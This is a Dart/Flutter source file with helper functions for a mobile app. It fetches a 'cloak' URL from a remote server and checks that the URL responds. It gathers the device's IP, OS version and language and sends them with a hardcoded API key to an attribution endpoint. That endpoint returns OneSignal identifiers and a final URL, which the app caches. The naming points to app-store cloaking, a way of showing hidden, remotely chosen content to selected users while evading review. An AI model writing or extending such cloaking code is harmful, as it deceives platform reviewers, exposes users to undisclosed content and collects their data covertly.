// ignore_for_file: empty_catches

import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:univer_test/features/home/pages/constants.dart';

Future<String?> getFinalRedirectedUrl(String initialUrl) async {
  final client = http.Client();
  try {
    var request = http.Request('GET', Uri.parse(initialUrl));
    var response = await client.send(request);

    while (response.isRedirect) {
      final redirectUrl = response.headers['location'];
      if (redirectUrl == null) break;
      request = http.Request('GET', Uri.parse(redirectUrl));
      response = await client.send(request);
    }

    final finalUrl = response.request?.url.toString();
    return finalUrl;
  } catch (e) {
    return null;
  } finally {
    client.close();
  }
}

Future<Map<String, String>> getUserInfo() async {
  String ip = '';
  String userAgent = '';
  String langCode = '';

  try {
    final response = await http.get(Uri.parse('https://api.ipify.org'));
    if (response.statusCode == 200) {
      ip = response.body;
    }
  } catch (e) {}

  try {
    userAgent = Platform.isIOS ? 'iOS' : 'Android';
    userAgent += '; ${Platform.operatingSystemVersion}';
  } catch (e) {}

  try {
    langCode = Platform.localeName.split('_')[0];
  } catch (e) {}

  return {
    'ip': ip,
    'useragent': userAgent,
    'langcode': langCode,
  };
}

Future<String?> getLinks() async {
  final Uri url = Uri.parse('https://generationh.quest/data');

  try {
    final response = await http.get(url, headers: {
      'apikey': API_KEY,
      'bundle': BUNDLE_ID,
    });

    if (response.statusCode == 403) {
      return null;
    }

    final Map<String, dynamic> data = json.decode(response.body);
    return data['cloack_url'];
  } catch (e) {
    return null;
  }
}

Future<bool> checkCloak(String cloakUrl) async {
  try {
    final response = await http.get(Uri.parse(cloakUrl));
    if (response.statusCode == 200) {
      return true;
    } else {
      return false;
    }
  } catch (e) {
    return false;
  }
}

Future<String?> getAttribution(
    String atrUrl, Map<String, String> userInfo) async {
  try {
    final response = await http.get(Uri.parse(atrUrl), headers: {
      'apikeyapp': 'uQcVcW915wSnndTg20z1zNvf',
      'ip': userInfo['ip'] ?? '',
      'useragent': userInfo['useragent'] ?? '',
      'langcode': userInfo['langcode'] ?? '',
    });

    final Map<String, dynamic> data = json.decode(response.body);
    String osUserKey = data['os_user_key'] ?? '';
    String pushSub = data['push_sub'] ?? '';
    print(osUserKey);
    print(pushSub);
    if (osUserKey.isNotEmpty) {
      await OneSignal.login(osUserKey);
    }

    if (pushSub.isNotEmpty) {
      var tags = {'sub_app': '$pushSub'};
      OneSignal.User.addTags(tags);
    }
    return data['final_url'];
  } catch (e) {
    return null;
  }
}

Future<void> cacheFinalUrl(String finalUrl) async {
  final prefs = await SharedPreferences.getInstance();
  await prefs.setString(FINAL_URL_KEY, finalUrl);
}

Future<String?> getCachedFinalUrl() async {
  final prefs = await SharedPreferences.getInstance();
  return prefs.getString(FINAL_URL_KEY);
}
